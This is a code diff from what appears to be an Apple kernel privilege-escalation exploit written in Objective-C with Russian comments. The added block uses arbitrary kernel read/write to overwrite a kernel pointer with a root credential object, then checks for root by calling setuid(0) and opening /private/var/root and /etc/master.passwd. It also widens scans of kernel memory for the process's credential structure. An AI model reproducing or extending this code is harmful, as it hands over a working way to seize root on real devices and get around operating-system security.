@@ -2712,12 +2712,36 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                 kpNote(r, [NSString stringWithFormat:@"  [W501] refpage=%#llx pa=%#llx t=%d",
                           (unsigned long long)refPage, (unsigned long long)refPA, refT]);
                 NSMutableString *rd = [NSMutableString string];
-                for (int j = -4; j <= 4; j++)
+                for (int j = -16; j <= 16; j++)
                     [rd appendFormat:@" %+x:%#018llx", j * 8, (unsigned long long)early_kread64(refVA + (uint64_t)j * 8)];
                 kpNote(r, [NSString stringWithFormat:@"  [W501] refctx:%@", rd]);
+                // 2.0.69: пробуем подменить сам указатель hit-18 → rootZVA
+                if (refT == 0x21) {
+                    uint64_t slot = early_kread64(refVA);
+                    kpNote(r, [NSString stringWithFormat:@"  [W501] slot=%#llx (wait hit-18=%#llx)",
+                              (unsigned long long)slot, (unsigned long long)(firstHitVA - 0x18)]);
+                    // сохраняем и пробуем rootZVA
+                    early_kwrite64(refVA, rootZVA);
+                    uint64_t rbS = early_kread64(refVA);
+                    uid_t u1 = getuid();
+                    int su = setuid(0);
+                    uid_t u2 = getuid();
+                    int fdR = open("/private/var/root", O_RDONLY);
+                    int fdM = open("/etc/master.passwd", O_RDONLY);
+                    kpNote(r, [NSString stringWithFormat:@"  [W501] ptr-swap readback=%#llx uid %u→%u setuid=%d open/root=%d master=%d",
+                              (unsigned long long)rbS, u1, u2, su, fdR, fdM]);
+                    if (fdR >= 0) close(fdR);
+                    if (fdM >= 0) close(fdM);
+                    if (u2 == 0) {
+                        kpNote(r, @"=== UID-0 WIN ★★★ ===");
+                    } else {
+                        early_kwrite64(refVA, slot);
+                        kpNote(r, @"  [W501] ptr-swap restored");
+                    }
+                }
                 // ищем в этом объекте указатель на наш ucred/rootZVA
-                uint64_t scanBase = refVA >= 0x80 ? refVA - 0x80 : refVA;
-                for (uint32_t o = 0; o < 0x100; o += 8) {
+                uint64_t scanBase = refVA >= 0x100 ? refVA - 0x100 : refVA;
+                for (uint32_t o = 0; o < 0x200; o += 8) {
                     uint64_t q = kp_untag_ptr(early_kread64(scanBase + o));
                     if (q == curUcred || q == rootZVA) {
                         kpNote(r, [NSString stringWithFormat:@"  [W501] ★ refobj+%#x = %s %#llx (t=%d)",
